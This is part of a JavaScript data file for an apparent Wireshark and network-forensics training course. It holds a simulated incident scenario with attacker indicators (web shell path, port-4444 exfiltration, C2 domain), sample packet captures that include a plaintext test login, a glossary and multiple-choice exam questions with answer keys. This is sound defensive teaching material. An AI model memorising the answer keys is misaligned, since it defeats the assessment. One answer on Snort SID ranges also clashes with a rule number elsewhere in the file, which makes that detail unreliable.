            "Trace lateral movement across the internal network via SMB and SSH",
            "Identify stolen database credentials from internal database traffic",
            "Extract exfiltrated archive files"
          ],
          content: `
            <p>Following initial access, the adversary pivoted from <code>10.10.10.20</code> to the internal database server at <code>10.10.10.30</code>. Use <code>tcp.stream</code> to isolate the lateral movement session.</p>
          `,
          mission: {
            title: "Identify Exfiltrated Data",
            steps: ["Locate the outbound connection to port 4444 and calculate the total number of exfiltrated customer records."]
          },
          knowledgeCheck: {
            question: "Which Wireshark filter isolates all SMB (Server Message Block) file sharing traffic used in Windows lateral movement?",
            options: ["smb || smb2", "windows.shares", "netbios.smb", "port 80"],
            correct: 0,
            explanation: "'smb || smb2' filters on Server Message Block protocol versions 1 and 2/3, commonly utilized for internal lateral movement."
          }
        },
        {
          id: "w-10-03",
          title: "03: Solution Guide",
          xp: 200,
          objectives: [
            "Cross-reference your findings against the master forensic solution",
            "Validate Indicators of Compromise (IOCs): hashes, IPs, domains",
            "Review defensive hardening recommendations"
          ],
          content: `
            <p><strong>Master IOC Summary:</strong></p>
            <ul>
              <li><strong>Attacker IP:</strong> <code>198.51.100.42</code></li>
              <li><strong>Compromised Server:</strong> <code>10.10.10.20</code></li>
              <li><strong>Web Shell:</strong> <code>/uploads/shell.php</code></li>
              <li><strong>Exfiltration Method:</strong> Raw TCP stream over port <code>4444</code></li>
              <li><strong>Remediation:</strong> Restrict file upload extensions, enforce egress firewall rules, deploy Snort 3 rule SID 1000042.</li>
            </ul>
          `,
          mission: {
            title: "Submit Final Incident Report",
            steps: ["Verify all questions in your analyst workbook match the master solution key."]
          },
          knowledgeCheck: {
            question: "What egress firewall policy would have completely prevented the adversary's data exfiltration over port 4444?",
            options: [
              "Default-Allow with port 80 blocked",
              "Default-Deny all outbound traffic except strictly authorized proxy ports (80/443)",
              "Disable IPv6",
              "Allow all ports above 1024"
            ],
            correct: 1,
            explanation: "A strict Default-Deny outbound (egress) firewall policy blocks unauthorized outbound connections to arbitrary ports like 4444."
          }
        }
      ]
    },
    {
      id: "mod-11",
      num: "11",
      title: "Final Certification Exam",
      shortTitle: "Final Exam",
      icon: "🎓",
      level: "Master",
      levelClass: "pro",
      estTime: "4–5 h",
      totalXp: 750,
      description: "Test your complete knowledge across networking theory, Wireshark filters, Nmap, Snort 3, and attack detection in our interactive exam simulator.",
      worksheets: [
        {
          id: "w-11-01",
          title: "01: Final Exam Theory Assessment",
          xp: 250,
          objectives: [
            "Complete comprehensive 15-question theoretical exam",
            "Score at least 80% to earn the certified Packet Ninja theoretical badge"
          ],
          content: `
            <p>This exam tests your mastery of OSI layers, TCP sliding windows, BPF vs Display filters, Nmap scan mechanics, and Snort rule logic. Click <strong>Launch Interactive Exam</strong> in the top menu to take the live simulation!</p>
          `,
          mission: {
            title: "Take Theory Exam",
            steps: ["Launch the Interactive Exam modal from the top navigation and achieve a passing score of 80%+."]
          },
          knowledgeCheck: {
            question: "Ready to launch the final practical exam?",
            options: [
              "Yes! I have reviewed all modules and cheat sheets",
              "Let me review Module 03 & 04 first"
            ],
            correct: 0,
            explanation: "You can take the exam at any time. Your score and earned XP will be recorded in your profile!"
          }
        },
        {
          id: "w-11-02",
          title: "02: Final Exam Practical Lab",
          xp: 500,
          objectives: [
            "Inspect raw PCAP scenarios using our live Wireshark analyzer",
            "Recover attacker IPs, flags, and credentials under timed conditions",
            "Earn the official Packet Ninja rank (4500+ XP)"
          ],
          content: `
            <p>The practical assessment presents real-world packet captures. Use the built-in <strong>Wireshark Sandbox</strong> to filter frames, reconstruct conversations, and extract security flags.</p>
          `,
          mission: {
            title: "Pass Practical Examination",
            steps: ["Achieve 4,500+ XP across the course to unlock the Dragon rank: 🐉 Packet Ninja!"]
          },
          knowledgeCheck: {
            question: "What is the maximum XP threshold required to achieve the highest rank '🐉 Packet Ninja'?",
            options: ["1,500 XP", "3,000 XP", "4,500 XP", "10,000 XP"],
            correct: 2,
            explanation: "4,500 XP unlocks the highest tier rank: 🐉 Packet Ninja!"
          }
        }
      ]
    }
  ],

  // Sample realistic PCAP packets for the interactive Wireshark dissector
  pcapFrames: [
    {
      id: 1,
      time: "0.000000",
      source: "10.10.10.10",
      dest: "10.10.10.20",
      protocol: "TCP",
      length: 74,
      info: "54234 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1",
      details: {
        frame: "Frame 1: 74 bytes on wire (592 bits), 74 bytes captured (592 bits) on interface eth0",
        ethernet: "Ethernet II, Src: 08:00:27:11:22:33 (Kali), Dst: 08:00:27:aa:bb:cc (Ubuntu-Srv)",
        ip: "Internet Protocol Version 4, Src: 10.10.10.10, Dst: 10.10.10.20, TTL: 64, Protocol: TCP (6)",
        transport: "Transmission Control Protocol, Src Port: 54234, Dst Port: 80, Seq: 0, Flags: 0x002 (SYN)",
        app: "None (Initial Handshake SYN)"
      },
      hex: "08 00 27 aa bb cc 08 00 27 11 22 33 08 00 45 00\n00 3c e4 1a 40 00 40 06 db 45 0a 0a 0a 0a 0a 0a\n0a 14 d3 da 00 50 1a 2b 3c 4d 00 00 00 00 a0 02\nfa f0 a8 21 00 00 02 04 05 b4 04 02 08 0a"
    },
    {
      id: 2,
      time: "0.000412",
      source: "10.10.10.20",
      dest: "10.10.10.10",
      protocol: "TCP",
      length: 74,
      info: "80 → 54234 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM=1",
      details: {
        frame: "Frame 2: 74 bytes on wire, captured on eth0",
        ethernet: "Ethernet II, Src: 08:00:27:aa:bb:cc (Ubuntu-Srv), Dst: 08:00:27:11:22:33 (Kali)",
        ip: "Internet Protocol Version 4, Src: 10.10.10.20, Dst: 10.10.10.10, TTL: 64, Protocol: TCP (6)",
        transport: "Transmission Control Protocol, Src Port: 80, Dst Port: 54234, Seq: 0, Ack: 1, Flags: 0x012 (SYN, ACK)",
        app: "None (Server SYN-ACK Response)"
      },
      hex: "08 00 27 11 22 33 08 00 27 aa bb cc 08 00 45 00\n00 3c 00 00 40 00 40 06 bf 60 0a 0a 0a 14 0a 0a\n0a 0a 00 50 d3 da 7f 8a 9b 0c 1a 2b 3c 4e a0 12\nfe 88 7c 3b 00 00 02 04 05 b4 04 02 08 0a"
    },
    {
      id: 3,
      time: "0.000520",
      source: "10.10.10.10",
      dest: "10.10.10.20",
      protocol: "TCP",
      length: 66,
      info: "54234 → 80 [ACK] Seq=1 Ack=1 Win=64240 Len=0",
      details: {
        frame: "Frame 3: 66 bytes on wire, captured on eth0",
        ethernet: "Ethernet II, Src: 08:00:27:11:22:33, Dst: 08:00:27:aa:bb:cc",
        ip: "Internet Protocol Version 4, Src: 10.10.10.10, Dst: 10.10.10.20, TTL: 64, Protocol: TCP (6)",
        transport: "Transmission Control Protocol, Src Port: 54234, Dst Port: 80, Seq: 1, Ack: 1, Flags: 0x010 (ACK)",
        app: "None (Handshake Complete - ESTABLISHED)"
      },
      hex: "08 00 27 aa bb cc 08 00 27 11 22 33 08 00 45 00\n00 34 e4 1b 40 00 40 06 db 4c 0a 0a 0a 0a 0a 0a\n0a 14 d3 da 00 50 1a 2b 3c 4e 7f 8a 9b 0d 80 10\nfa f0 63 94 00 00 01 01 08 0a"
    },
    {
      id: 4,
      time: "0.002100",
      source: "10.10.10.10",
      dest: "10.10.10.20",
      protocol: "HTTP",
      length: 215,
      info: "POST /login.php HTTP/1.1 (application/x-www-form-urlencoded)",
      details: {
        frame: "Frame 4: 215 bytes on wire, captured on eth0",
        ethernet: "Ethernet II, Src: 08:00:27:11:22:33, Dst: 08:00:27:aa:bb:cc",
        ip: "Internet Protocol Version 4, Src: 10.10.10.10, Dst: 10.10.10.20, TTL: 64, Protocol: TCP (6)",
        transport: "Transmission Control Protocol, Src Port: 54234, Dst Port: 80, Seq: 1, Ack: 1, Flags: 0x018 (PSH, ACK)",
        app: "Hypertext Transfer Protocol\nPOST /login.php HTTP/1.1\\r\\nHost: 10.10.10.20\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nusername=admin&password=SuperSecretPassword123!"
      },
      hex: "50 4f 53 54 20 2f 6c 6f 67 69 6e 2e 70 68 70 20\n48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20\n31 30 2e 31 30 2e 31 30 2e 32 30 0d 0a 0d 0a 75\n73 65 72 6e 61 6d 65 3d 61 64 6d 69 6e 26 70 61\n73 73 77 6f 72 64 3d 53 75 70 65 72 53 65 63 72\n65 74 50 61 73 73 77 6f 72 64 31 32 33 21"
    },
    {
      id: 5,
      time: "0.003400",
      source: "10.10.10.20",
      dest: "10.10.10.10",
      protocol: "HTTP",
      length: 185,
      info: "HTTP/1.1 200 OK (text/html)",
      details: {
        frame: "Frame 5: 185 bytes on wire, captured on eth0",
        ethernet: "Ethernet II, Src: 08:00:27:aa:bb:cc, Dst: 08:00:27:11:22:33",
        ip: "Internet Protocol Version 4, Src: 10.10.10.20, Dst: 10.10.10.10, TTL: 64, Protocol: TCP (6)",
        transport: "Transmission Control Protocol, Src Port: 80, Dst Port: 54234, Seq: 1, Ack: 150, Flags: 0x018 (PSH, ACK)",
        app: "Hypertext Transfer Protocol\nHTTP/1.1 200 OK\\r\\nServer: Apache/2.4.58 (Ubuntu)\\r\\nSet-Cookie: PHPSESSID=9a8b7c6d5e4f3a2b1c\\r\\n\\r\\n<h1>Welcome Admin</h1>"
      },
      hex: "48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d\n0a 53 65 72 76 65 72 3a 20 41 70 61 63 68 65 2f\n32 2e 34 2e 35 38 0d 0a 0d 0a 3c 68 31 3e 57 65\n6c 63 6f 6d 65 20 41 64 6d 69 6e 3c 2f 68 31 3e"
    },
    {
      id: 6,
      time: "0.015200",
      source: "10.10.10.10",
      dest: "10.10.10.20",
      protocol: "DNS",
      length: 82,
      info: "Standard query 0x1a2b A internal-c2.labnet",
      details: {
        frame: "Frame 6: 82 bytes on wire, captured on eth0",
        ethernet: "Ethernet II, Src: 08:00:27:11:22:33, Dst: 08:00:27:aa:bb:cc",
        ip: "Internet Protocol Version 4, Src: 10.10.10.10, Dst: 10.10.10.20, TTL: 64, Protocol: UDP (17)",
        transport: "User Datagram Protocol, Src Port: 49812, Dst Port: 53, Length: 48",
        app: "Domain Name System (query)\nTransaction ID: 0x1a2b\nFlags: 0x0100 (Standard query)\nQueries: internal-c2.labnet: type A, class IN"
      },
      hex: "1a 2b 01 00 00 01 00 00 00 00 00 00 0b 69 6e 74\n65 72 6e 61 6c 2d 63 32 06 6c 61 62 6e 65 74 00\n00 01 00 01"
    },
    {
      id: 7,
      time: "0.015650",
      source: "10.10.10.20",
      dest: "10.10.10.10",
      protocol: "DNS",
      length: 98,
      info: "Standard query response 0x1a2b A internal-c2.labnet A 198.51.100.42",
      details: {
        frame: "Frame 7: 98 bytes on wire, captured on eth0",
        ethernet: "Ethernet II, Src: 08:00:27:aa:bb:cc, Dst: 08:00:27:11:22:33",
        ip: "Internet Protocol Version 4, Src: 10.10.10.20, Dst: 10.10.10.10, TTL: 64, Protocol: UDP (17)",
        transport: "User Datagram Protocol, Src Port: 53, Dst Port: 49812, Length: 64",
        app: "Domain Name System (response)\nTransaction ID: 0x1a2b\nFlags: 0x8180 (Standard query response, No error)\nAnswers: internal-c2.labnet: type A, class IN, addr 198.51.100.42"
      },
      hex: "1a 2b 81 80 00 01 00 01 00 00 00 00 0b 69 6e 74\n65 72 6e 61 6c 2d 63 32 06 6c 61 62 6e 65 74 00\n00 01 00 01 c0 0c 00 01 00 01 00 00 0e 10 00 04\nc6 33 64 2a"
    },
    {
      id: 8,
      time: "0.024100",
      source: "08:00:27:11:22:33",
      dest: "ff:ff:ff:ff:ff:ff",
      protocol: "ARP",
      length: 42,
      info: "Who has 10.10.10.30? Tell 10.10.10.10",
      details: {
        frame: "Frame 8: 42 bytes on wire, captured on eth0",
        ethernet: "Ethernet II, Src: 08:00:27:11:22:33, Dst: ff:ff:ff:ff:ff:ff (Broadcast)",
        ip: "None (ARP is Layer 2/3)",
        transport: "Address Resolution Protocol (request)\nHardware type: Ethernet (1)\nProtocol type: IPv4 (0x0800)\nSender MAC: 08:00:27:11:22:33, Sender IP: 10.10.10.10\nTarget MAC: 00:00:00:00:00:00, Target IP: 10.10.10.30",
        app: "None"
      },
      hex: "ff ff ff ff ff ff 08 00 27 11 22 33 08 06 00 01\n08 00 06 04 00 01 08 00 27 11 22 33 0a 0a 0a 0a\n00 00 00 00 00 00 0a 0a 0a 1e"
    },
    {
      id: 9,
      time: "0.024380",
      source: "08:00:27:33:44:55",
      dest: "08:00:27:11:22:33",
      protocol: "ARP",
      length: 42,
      info: "10.10.10.30 is at 08:00:27:33:44:55",
      details: {
        frame: "Frame 9: 42 bytes on wire, captured on eth0",
        ethernet: "Ethernet II, Src: 08:00:27:33:44:55, Dst: 08:00:27:11:22:33",
        ip: "None (ARP reply)",
        transport: "Address Resolution Protocol (reply)\nHardware type: Ethernet (1)\nProtocol type: IPv4 (0x0800)\nSender MAC: 08:00:27:33:44:55, Sender IP: 10.10.10.30\nTarget MAC: 08:00:27:11:22:33, Target IP: 10.10.10.10",
        app: "None"
      },
      hex: "08 00 27 11 22 33 08 00 27 33 44 55 08 06 00 01\n08 00 06 04 00 02 08 00 27 33 44 55 0a 0a 0a 1e\n08 00 27 11 22 33 0a 0a 0a 0a"
    },
    {
      id: 10,
      time: "0.038100",
      source: "10.10.10.10",
      dest: "10.10.10.30",
      protocol: "TCP",
      length: 60,
      info: "43210 → 21 [SYN] Seq=0 Win=1024 Len=0",
      details: {
        frame: "Frame 10: 60 bytes on wire (Nmap SYN scan probe)",
        ethernet: "Ethernet II, Src: 08:00:27:11:22:33, Dst: 08:00:27:33:44:55",
        ip: "Internet Protocol Version 4, Src: 10.10.10.10, Dst: 10.10.10.30, TTL: 48, Protocol: TCP (6)",
        transport: "Transmission Control Protocol, Src Port: 43210, Dst Port: 21 (FTP), Seq: 0, Flags: 0x002 (SYN)",
        app: "Nmap Port Scan Probe"
      },
      hex: "08 00 27 33 44 55 08 00 27 11 22 33 08 00 45 00\n00 28 a1 b2 00 00 30 06 a2 b3 0a 0a 0a 0a 0a 0a\n0a 1e a8 ca 00 15 00 00 00 00 00 00 00 00 50 02\n04 00 b1 c2 00 00"
    }
  ],

  // Full glossary terms (derived from resources/glossary.md)
  glossary: [
    { term: "ACK (Acknowledgment)", category: "TCP", def: "A TCP control flag indicating the Acknowledgment Number field contains the next sequence number expected by the receiver." },
    { term: "Anycast", category: "Routing", def: "A network routing methodology where a single destination IP address is shared by multiple physical routing endpoints (used by Cloudflare, Google 8.8.8.8)." },
    { term: "APIPA", category: "IP", def: "Automatic Private IP Addressing (169.254.0.0/16) automatically assigned by client OS when DHCP fails." },
    { term: "ARP", category: "Ethernet", def: "Address Resolution Protocol (RFC 826) resolving Layer 3 IPv4 addresses to Layer 2 physical MAC addresses." },
    { term: "ARP Spoofing", category: "Attacks", def: "A Layer 2 MITM attack transmitting false ARP replies to redirect LAN traffic through an adversary's interface." },
    { term: "BDP (Bandwidth-Delay Product)", category: "TCP", def: "Link capacity (bps) multiplied by RTT (sec). Dictates the TCP window size required to saturate a link." },
    { term: "Bind Shell", category: "Malware", def: "A payload where the victim machine listens on a port and binds a shell (/bin/bash) to incoming connections." },
    { term: "BPF (Berkeley Packet Filter)", category: "Wireshark", def: "Kernel-level syntax used by libpcap and Wireshark for ultra-fast, pre-memory capture filtering." },
    { term: "C2 (Command and Control)", category: "Attacks", def: "Covert infrastructure and protocols used by attackers to maintain communication and issue commands to compromised endpoints." },
    { term: "CIDR", category: "IP", def: "Classless Inter-Domain Routing (RFC 1519), replacing legacy Class A/B/C networks with prefix-length masks (e.g. /24)." },
    { term: "DAI (Dynamic ARP Inspection)", category: "Defense", def: "An enterprise switch security feature that inspects ARP packets against the DHCP snooping binding database." },
    { term: "DF Bit (Don't Fragment)", category: "IP", def: "An IPv4 header flag instructing routers never to fragment a packet. Packets exceeding link MTU trigger ICMP Type 3 Code 4." },
    { term: "DHCP Snooping", category: "Defense", def: "A Layer 2 security mechanism filtering untrusted DHCP server offers on user-facing switch access ports." },
    { term: "DORA", category: "Protocols", def: "The 4 sequential stages of DHCP lease negotiation: Discover, Offer, Request, and Acknowledgment." },
    { term: "Ephemeral Port", category: "TCP", def: "Temporary dynamic high ports (49152–65535) allocated by operating systems for outbound client sockets." },
    { term: "EtherType", category: "Ethernet", def: "A 2-octet field in Ethernet II frames identifying the encapsulated payload (e.g. 0x0800 for IPv4, 0x0806 for ARP)." },
    { term: "FCS (Frame Check Sequence)", category: "Ethernet", def: "A 4-byte CRC-32 checksum at the end of an Ethernet frame used by the physical NIC to detect transmission bit errors." },
    { term: "Five-Tuple", category: "Networking", def: "The 5 values uniquely identifying an IP connection: Source IP, Source Port, Destination IP, Destination Port, and Protocol." },
    { term: "GARP (Gratuitous ARP)", category: "Ethernet", def: "An unprompted ARP reply where Sender IP equals Target IP, used to announce IP updates or failover states." },
    { term: "Jitter", category: "Malware", def: "Randomized percentage variations added to malware beacon intervals to evade fixed-interval mathematical detection." },
    { term: "MSS (Maximum Segment Size)", category: "TCP", def: "The largest amount of data (in bytes) a computer or device can receive in a single unfragmented TCP segment." },
    { term: "MTU (Maximum Transmission Unit)", category: "Networking", def: "The largest packet or frame size (usually 1500 bytes for standard Ethernet) that can be sent over a link." },
    { term: "Nmap Scripting Engine (NSE)", category: "Tools", def: "Lua-based scripting engine inside Nmap allowing automated vulnerability checks, network discovery, and brute force." },
    { term: "PCAP / PCAPNG", category: "Wireshark", def: "Standard file formats for storing packet captures. PCAPNG supports multi-interface captures and packet comments." },
    { term: "Promiscuous Mode", category: "Wireshark", def: "A NIC configuration passing all frames on the physical wire to the operating system, regardless of destination MAC." },
    { term: "Reverse Shell", category: "Attacks", def: "A shell where the victim target initiates an outbound TCP connection back to the attacker's listener, evading inbound firewalls." },
    { term: "RST (Reset)", category: "TCP", def: "A TCP control flag that immediately aborts a connection or signals a closed/refused port." },
    { term: "Snort 3", category: "Defense", def: "An open-source, multi-threaded network intrusion detection and prevention system (NIDS/NIPS)." },
    { term: "SYN Flood", category: "Attacks", def: "A Denial-of-Service attack saturating a server's half-open connection table by sending floods of SYN packets without completing handshakes." },
    { term: "Three-Way Handshake", category: "TCP", def: "The 3-step TCP connection initialization process: SYN -> SYN-ACK -> ACK." },
    { term: "TShark", category: "Tools", def: "The command-line interface counterpart to Wireshark for headless terminal packet capture and automated dissection." }
  ],

  // Interactive Final Exam questions pool
  examQuestions: [
    {
      q: "Which layer of the OSI model does a stateful firewall inspect to track TCP sequence numbers and port numbers?",
      options: ["Layer 2 (Data Link)", "Layer 3 (Network)", "Layer 4 (Transport)", "Layer 7 (Application)"],
      correct: 2,
      explanation: "TCP ports, sequence numbers, and connection states belong strictly to Layer 4 (Transport)."
    },
    {
      q: "What does the Wireshark display filter 'tcp.flags.syn == 1 && tcp.flags.ack == 0' isolate?",
      options: [
        "Packets closing an established session",
        "Initial TCP connection requests (SYN scans or connection attempts)",
        "Packets with corrupted checksums",
        "HTTP 200 OK responses"
      ],
      correct: 1,
      explanation: "SYN=1 and ACK=0 only occurs on the very first packet of a TCP handshake or an Nmap SYN stealth scan probe."
    },
    {
      q: "If an adversary conducts an ARP cache poisoning attack in an isolated LAN, what Wireshark indicator flags the event?",
      options: [
        "tcp.analysis.retransmission",
        "arp.duplicate-address-detected",
        "ip.ttl < 5",
        "dns.flags.rcode == 3"
      ],
      correct: 1,
      explanation: "Wireshark detects multiple distinct MAC addresses claiming the same IP address and flags 'arp.duplicate-address-detected'."
    },
    {
      q: "Why do penetration testers prefer Reverse Shells over Bind Shells?",
      options: [
        "Reverse shells encrypt all traffic with TLS 1.3 by default",
        "Enterprise firewalls drop unsolicited inbound connections but permit internal hosts to make outbound connections",
        "Reverse shells don't require IP addresses",
        "Bind shells only function on Unix systems"
      ],
      correct: 1,
      explanation: "Standard stateful firewalls drop unsolicited inbound traffic while allowing internal hosts to establish outbound connections."
    },
    {
      q: "How many usable host IP addresses exist in a /26 IPv4 subnet?",
      options: ["30", "62", "64", "126"],
      correct: 1,
      explanation: "32 - 26 = 6 host bits. 2^6 = 64 total addresses. Subtract 2 (Network + Broadcast) = 62 usable host IPs."
    },
    {
      q: "What is the primary difference between a BPF Capture Filter and a Wireshark Display Filter?",
      options: [
        "BPF filters can only inspect HTTP headers",
        "Capture filters discard unmatched packets at the kernel level before reaching RAM; Display filters only hide packets from the current view",
        "Display filters require root privileges",
        "BPF filters are applied in Lua"
      ],
      correct: 1,
      explanation: "BPF runs in kernel space via libpcap and drops non-matching packets permanently, saving disk and CPU."
    },
    {
      q: "In custom Snort 3 rules, what Signature ID (SID) range is designated for local organizational rules?",
      options: ["1 – 1,000", "1,001 – 100,000", "1,000,001 and above", "Negative numbers"],
      correct: 2,
      explanation: "SIDs 1,000,001+ are reserved for user-defined local rules to prevent collisions with official community rulesets."
    },
    {
      q: "What does a 'TCP ZeroWindow' notification in Wireshark indicate?",
      options: [
        "The sender has closed the socket",
        "The receiver's TCP buffer is completely full, instructing the sender to temporarily halt data transmission",
        "The link speed is zero Mbps",
        "A successful DNS query"
      ],
      correct: 1,
      explanation: "ZeroWindow is TCP flow control notifying the remote host that the receiver application buffer cannot accept any more bytes."
    },
    {
      q: "Which file format enables comments per packet and simultaneous captures from multiple network interfaces?",
      options: [".pcap", ".pcapng", ".cap", ".dmp"],
      correct: 1,
      explanation: "PCAPNG (Next Generation) introduced native multi-interface support, interface statistics, and packet annotations."
    },
    {
      q: "What Nmap scan type sends a SYN packet and immediately tears down the connection with a RST upon receiving a SYN-ACK?",
      options: [
        "TCP Connect Scan (-sT)",
        "SYN Stealth Scan (-sS)",
        "UDP Scan (-sU)",
        "Null Scan (-sN)"
      ],
      correct: 1,
      explanation: "The SYN Stealth Scan (-sS) never completes the 3-way handshake; it aborts half-open connections with a RST."
    }
  ]
};
